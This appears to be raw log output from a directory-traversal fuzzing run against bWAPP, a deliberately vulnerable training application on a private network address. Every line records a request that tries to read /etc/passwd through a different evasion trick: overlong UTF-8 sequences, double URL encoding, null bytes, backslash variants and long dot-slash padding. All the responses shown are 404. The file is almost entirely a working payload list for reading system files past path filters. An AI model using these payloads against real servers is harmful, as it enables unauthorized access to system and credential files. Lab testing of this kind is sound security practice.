699,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e//etc/passwd
701,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e//etc/passwd
698,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e//etc/passwd
557,404,9L,39W,http://192.168.1.86/bWAPP/....\....\....\....\....\....\/etc/passwd
499,404,9L,39W,http://192.168.1.86/bWAPP/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../..//etc/passwd
711,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f/etc/passwd
704,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%2f/etc/passwd
702,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e//etc/passwd
706,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f/etc/passwd
707,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f/etc/passwd
703,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e//etc/passwd
708,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f/etc/passwd
705,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f/etc/passwd
710,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f/etc/passwd
709,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f/etc/passwd
718,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c/etc/passwd
717,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c/etc/passwd
715,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%5c..%c0%5c..%c0%5c..%c0%5c/etc/passwd
713,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%5c..%c0%5c/etc/passwd
712,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%5c/etc/passwd
724,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\/etc/passwd
720,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e\/etc/passwd
721,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e\%c0%2e%c0%2e\/etc/passwd
723,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\/etc/passwd
722,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\/etc/passwd
727,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\/etc/passwd
725,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\/etc/passwd
739,404,9L,39W,http://192.168.1.86/bWAPP////%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
738,404,9L,39W,http://192.168.1.86/bWAPP////%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
726,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\%c0%2e%c0%2e\/etc/passwd
747,404,9L,39W,http://192.168.1.86/bWAPP/\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd
728,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%5c/etc/passwd
729,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c/etc/passwd
741,404,9L,39W,http://192.168.1.86/bWAPP////%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
744,404,9L,39W,http://192.168.1.86/bWAPP/\\\%2e%2e%5c/etc/passwd
767,404,9L,39W,http://192.168.1.86/bWAPP/..///..///..///..///..///..///..///..////etc/passwd
764,404,9L,39W,http://192.168.1.86/bWAPP/..///..///..///..///..////etc/passwd
755,404,9L,39W,http://192.168.1.86/bWAPP/..//..//..//..///etc/passwd
770,404,9L,39W,http://192.168.1.86/bWAPP/..\\..\\..\\/etc/passwd
762,404,9L,39W,http://192.168.1.86/bWAPP/..///..///..////etc/passwd
754,404,9L,39W,http://192.168.1.86/bWAPP/..//..//..///etc/passwd
768,404,9L,39W,http://192.168.1.86/bWAPP/..\\/etc/passwd
772,404,9L,39W,http://192.168.1.86/bWAPP/..\\..\\..\\..\\..\\/etc/passwd
769,404,9L,39W,http://192.168.1.86/bWAPP/..\\..\\/etc/passwd
753,404,9L,39W,http://192.168.1.86/bWAPP/..//..///etc/passwd
766,404,9L,39W,http://192.168.1.86/bWAPP/..///..///..///..///..///..///..////etc/passwd
752,404,9L,39W,http://192.168.1.86/bWAPP/..///etc/passwd
745,404,9L,39W,http://192.168.1.86/bWAPP/\\\%2e%2e%5c%2e%2e%5c/etc/passwd
765,404,9L,39W,http://192.168.1.86/bWAPP/..///..///..///..///..///..////etc/passwd
742,404,9L,39W,http://192.168.1.86/bWAPP////%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
743,404,9L,39W,http://192.168.1.86/bWAPP////%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
740,404,9L,39W,http://192.168.1.86/bWAPP////%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
731,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c/etc/passwd
733,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c/etc/passwd
732,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c/etc/passwd
737,404,9L,39W,http://192.168.1.86/bWAPP////%2e%2e%2f%2e%2e%2f/etc/passwd
751,404,9L,39W,http://192.168.1.86/bWAPP/\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd
719,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c/etc/passwd
750,404,9L,39W,http://192.168.1.86/bWAPP/\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd
749,404,9L,39W,http://192.168.1.86/bWAPP/\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd
735,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c/etc/passwd
759,404,9L,39W,http://192.168.1.86/bWAPP/..//..//..//..//..//..//..//..///etc/passwd
758,404,9L,39W,http://192.168.1.86/bWAPP/..//..//..//..//..//..//..///etc/passwd
748,404,9L,39W,http://192.168.1.86/bWAPP/\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd
716,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c/etc/passwd
746,404,9L,39W,http://192.168.1.86/bWAPP/\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd
763,404,9L,39W,http://192.168.1.86/bWAPP/..///..///..///..////etc/passwd
714,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%5c..%c0%5c..%c0%5c/etc/passwd
771,404,9L,39W,http://192.168.1.86/bWAPP/..\\..\\..\\..\\/etc/passwd
760,404,9L,39W,http://192.168.1.86/bWAPP/..////etc/passwd
730,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c/etc/passwd
736,404,9L,39W,http://192.168.1.86/bWAPP////%2e%2e%2f/etc/passwd
761,404,9L,39W,http://192.168.1.86/bWAPP/..///..////etc/passwd
734,404,9L,39W,http://192.168.1.86/bWAPP/%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c%c0%2e%c0%2e%c0%5c/etc/passwd
473,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e%255c%252e%252e%255c/etc/passwd;index.html
773,404,9L,39W,http://192.168.1.86/bWAPP/..\\..\\..\\..\\..\\..\\/etc/passwd
757,404,9L,39W,http://192.168.1.86/bWAPP/..//..//..//..//..//..///etc/passwd
756,404,9L,39W,http://192.168.1.86/bWAPP/..//..//..//..//..///etc/passwd
156,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af/etc/passwd
775,404,9L,39W,http://192.168.1.86/bWAPP/..\\..\\..\\..\\..\\..\\..\\..\\/etc/passwd
774,404,9L,39W,http://192.168.1.86/bWAPP/..\\..\\..\\..\\..\\..\\..\\/etc/passwd
778,404,9L,39W,http://192.168.1.86/bWAPP/..\\\..\\\..\\\/etc/passwd
779,404,9L,39W,http://192.168.1.86/bWAPP/..\\\..\\\..\\\..\\\/etc/passwd
780,404,9L,39W,http://192.168.1.86/bWAPP/..\\\..\\\..\\\..\\\..\\\/etc/passwd
776,404,9L,39W,http://192.168.1.86/bWAPP/..\\\/etc/passwd
441,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e\%2e%2e\/etc/passwd;index.html
782,404,9L,39W,http://192.168.1.86/bWAPP/..\\\..\\\..\\\..\\\..\\\..\\\..\\\/etc/passwd
781,404,9L,39W,http://192.168.1.86/bWAPP/..\\\..\\\..\\\..\\\..\\\..\\\/etc/passwd
777,404,9L,39W,http://192.168.1.86/bWAPP/..\\\..\\\/etc/passwd
783,404,9L,39W,http://192.168.1.86/bWAPP/..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\/etc/passwd
193,404,9L,39W,http://192.168.1.86/bWAPP/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\/etc/passwd
788,404,9L,39W,http://192.168.1.86/bWAPP/./\/././\/././\/././\/././\/.//etc/passwd
787,404,9L,39W,http://192.168.1.86/bWAPP/./\/././\/././\/././\/.//etc/passwd
284,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd%00index.html
824,404,9L,39W,http://192.168.1.86/bWAPP/.\..\/etc/passwd
804,404,9L,39W,http://192.168.1.86/bWAPP/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../..//etc/passwd
805,404,9L,39W,http://192.168.1.86/bWAPP/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../..//etc/passwd
806,404,9L,39W,http://192.168.1.86/bWAPP/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../..//etc/passwd
828,404,9L,39W,http://192.168.1.86/bWAPP/.\..\.\..\.\..\.\..\.\..\/etc/passwd
820,404,9L,39W,http://192.168.1.86/bWAPP/./.././.././.././.././..//etc/passwd
819,404,9L,39W,http://192.168.1.86/bWAPP/./.././.././.././..//etc/passwd
801,404,9L,39W,http://192.168.1.86/bWAPP/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../..//etc/passwd
835,404,9L,39W,http://192.168.1.86/bWAPP/.//..//.//..//.//..//.//..///etc/passwd
830,404,9L,39W,http://192.168.1.86/bWAPP/.\..\.\..\.\..\.\..\.\..\.\..\.\..\/etc/passwd
831,404,9L,39W,http://192.168.1.86/bWAPP/.\..\.\..\.\..\.\..\.\..\.\..\.\..\.\..\/etc/passwd
833,404,9L,39W,http://192.168.1.86/bWAPP/.//..//.//..///etc/passwd
802,404,9L,39W,http://192.168.1.86/bWAPP/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../..//etc/passwd
799,404,9L,39W,http://192.168.1.86/bWAPP/.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\/etc/passwd
800,404,9L,39W,http://192.168.1.86/bWAPP/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././..//etc/passwd
798,404,9L,39W,http://192.168.1.86/bWAPP/.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\/etc/passwd
797,404,9L,39W,http://192.168.1.86/bWAPP/.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\/etc/passwd
837,404,9L,39W,http://192.168.1.86/bWAPP/.//..//.//..//.//..//.//..//.//..//.//..///etc/passwd
834,404,9L,39W,http://192.168.1.86/bWAPP/.//..//.//..//.//..///etc/passwd
836,404,9L,39W,http://192.168.1.86/bWAPP/.//..//.//..//.//..//.//..//.//..///etc/passwd
839,404,9L,39W,http://192.168.1.86/bWAPP/.//..//.//..//.//..//.//..//.//..//.//..//.//..//.//..///etc/passwd
823,404,9L,39W,http://192.168.1.86/bWAPP/./.././.././.././.././.././.././.././..//etc/passwd
844,404,9L,39W,http://192.168.1.86/bWAPP/.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\/etc/passwd
846,404,9L,39W,http://192.168.1.86/bWAPP/.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\/etc/passwd
841,404,9L,39W,http://192.168.1.86/bWAPP/.\\..\\.\\..\\/etc/passwd
843,404,9L,39W,http://192.168.1.86/bWAPP/.\\..\\.\\..\\.\\..\\.\\..\\/etc/passwd
847,404,9L,39W,http://192.168.1.86/bWAPP/.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\/etc/passwd
785,404,9L,39W,http://192.168.1.86/bWAPP/./\/././\/.//etc/passwd
826,404,9L,39W,http://192.168.1.86/bWAPP/.\..\.\..\.\..\/etc/passwd
786,404,9L,39W,http://192.168.1.86/bWAPP/./\/././\/././\/.//etc/passwd
816,404,9L,39W,http://192.168.1.86/bWAPP/./..//etc/passwd
789,404,9L,39W,http://192.168.1.86/bWAPP/./\/././\/././\/././\/././\/././\/.//etc/passwd
845,404,9L,39W,http://192.168.1.86/bWAPP/.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\/etc/passwd
848,404,9L,39W,http://192.168.1.86/bWAPP/%00../etc/passwd
850,404,9L,39W,http://192.168.1.86/bWAPP/%00../%00../%00../etc/passwd
851,404,9L,39W,http://192.168.1.86/bWAPP/%00../%00../%00../%00../etc/passwd
852,404,9L,39W,http://192.168.1.86/bWAPP/%00../%00../%00../%00../%00../etc/passwd
853,404,9L,39W,http://192.168.1.86/bWAPP/%00../%00../%00../%00../%00../%00../etc/passwd
856,404,9L,39W,http://192.168.1.86/bWAPP/.%00./etc/passwd
857,404,9L,39W,http://192.168.1.86/bWAPP/.%00./.%00./etc/passwd
861,404,9L,39W,http://192.168.1.86/bWAPP/.%00./.%00./.%00./.%00./.%00./.%00./etc/passwd
849,404,9L,39W,http://192.168.1.86/bWAPP/%00../%00../etc/passwd
855,404,9L,39W,http://192.168.1.86/bWAPP/%00../%00../%00../%00../%00../%00../%00../%00../etc/passwd
859,404,9L,39W,http://192.168.1.86/bWAPP/.%00./.%00./.%00./.%00./etc/passwd
860,404,9L,39W,http://192.168.1.86/bWAPP/.%00./.%00./.%00./.%00./.%00./etc/passwd
790,404,9L,39W,http://192.168.1.86/bWAPP/./\/././\/././\/././\/././\/././\/././\/.//etc/passwd
792,404,9L,39W,http://192.168.1.86/bWAPP/.\/\.\/etc/passwd
794,404,9L,39W,http://192.168.1.86/bWAPP/.\/\.\.\/\.\.\/\.\/etc/passwd
795,404,9L,39W,http://192.168.1.86/bWAPP/.\/\.\.\/\.\.\/\.\.\/\.\/etc/passwd
862,404,9L,39W,http://192.168.1.86/bWAPP/.%00./.%00./.%00./.%00./.%00./.%00./.%00./etc/passwd
796,404,9L,39W,http://192.168.1.86/bWAPP/.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\/etc/passwd
865,404,9L,39W,http://192.168.1.86/bWAPP/..%00/..%00/etc/passwd
864,404,9L,39W,http://192.168.1.86/bWAPP/..%00/etc/passwd
793,404,9L,39W,http://192.168.1.86/bWAPP/.\/\.\.\/\.\/etc/passwd
866,404,9L,39W,http://192.168.1.86/bWAPP/..%00/..%00/..%00/etc/passwd
870,404,9L,39W,http://192.168.1.86/bWAPP/..%00/..%00/..%00/..%00/..%00/..%00/..%00/etc/passwd
871,404,9L,39W,http://192.168.1.86/bWAPP/..%00/..%00/..%00/..%00/..%00/..%00/..%00/..%00/etc/passwd
868,404,9L,39W,http://192.168.1.86/bWAPP/..%00/..%00/..%00/..%00/..%00/etc/passwd
867,404,9L,39W,http://192.168.1.86/bWAPP/..%00/..%00/..%00/..%00/etc/passwd
869,404,9L,39W,http://192.168.1.86/bWAPP/..%00/..%00/..%00/..%00/..%00/..%00/etc/passwd
854,404,9L,39W,http://192.168.1.86/bWAPP/%00../%00../%00../%00../%00../%00../%00../etc/passwd
840,404,9L,39W,http://192.168.1.86/bWAPP/.\\..\\/etc/passwd
858,404,9L,39W,http://192.168.1.86/bWAPP/.%00./.%00./.%00./etc/passwd
791,404,9L,39W,http://192.168.1.86/bWAPP/./\/././\/././\/././\/././\/././\/././\/././\/.//etc/passwd
838,404,9L,39W,http://192.168.1.86/bWAPP/.//..//.//..//.//..//.//..//.//..//.//..//.//..///etc/passwd
821,404,9L,39W,http://192.168.1.86/bWAPP/./.././.././.././.././.././..//etc/passwd
822,404,9L,39W,http://192.168.1.86/bWAPP/./.././.././.././.././.././.././..//etc/passwd
807,404,9L,39W,http://192.168.1.86/bWAPP/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../..//etc/passwd
817,404,9L,39W,http://192.168.1.86/bWAPP/./.././..//etc/passwd
829,404,9L,39W,http://192.168.1.86/bWAPP/.\..\.\..\.\..\.\..\.\..\.\..\/etc/passwd
832,404,9L,39W,http://192.168.1.86/bWAPP/.//..///etc/passwd
784,404,9L,39W,http://192.168.1.86/bWAPP/./\/.//etc/passwd
827,404,9L,39W,http://192.168.1.86/bWAPP/.\..\.\..\.\..\.\..\/etc/passwd
818,404,9L,39W,http://192.168.1.86/bWAPP/./.././.././..//etc/passwd
340,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd%00index.html
72,404,9L,39W,http://192.168.1.86/bWAPP/..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c/etc/passwd
73,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\/etc/passwd
863,404,9L,39W,http://192.168.1.86/bWAPP/.%00./.%00./.%00./.%00./.%00./.%00./.%00./.%00./etc/passwd
842,404,9L,39W,http://192.168.1.86/bWAPP/.\\..\\.\\..\\.\\..\\/etc/passwd
98,404,9L,39W,http://192.168.1.86/bWAPP/%252e%252e\%252e%252e\%252e%252e\/etc/passwd
97,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c/etc/passwd
15,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd
16,404,9L,39W,http://192.168.1.86/bWAPP/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd
17,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e//etc/passwd
18,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e//etc/passwd
19,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e//etc/passwd
20,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd
689,404,9L,39W,http://192.168.1.86/bWAPP/..%c0%2f..%c0%2f/etc/passwd
21,404,9L,39W,http://192.168.1.86/bWAPP/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd
803,404,9L,39W,http://192.168.1.86/bWAPP/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../..//etc/passwd
825,404,9L,39W,http://192.168.1.86/bWAPP/.\..\.\..\/etc/passwd
136,404,9L,39W,http://192.168.1.86/bWAPP/..%25c0%25af/etc/passwd
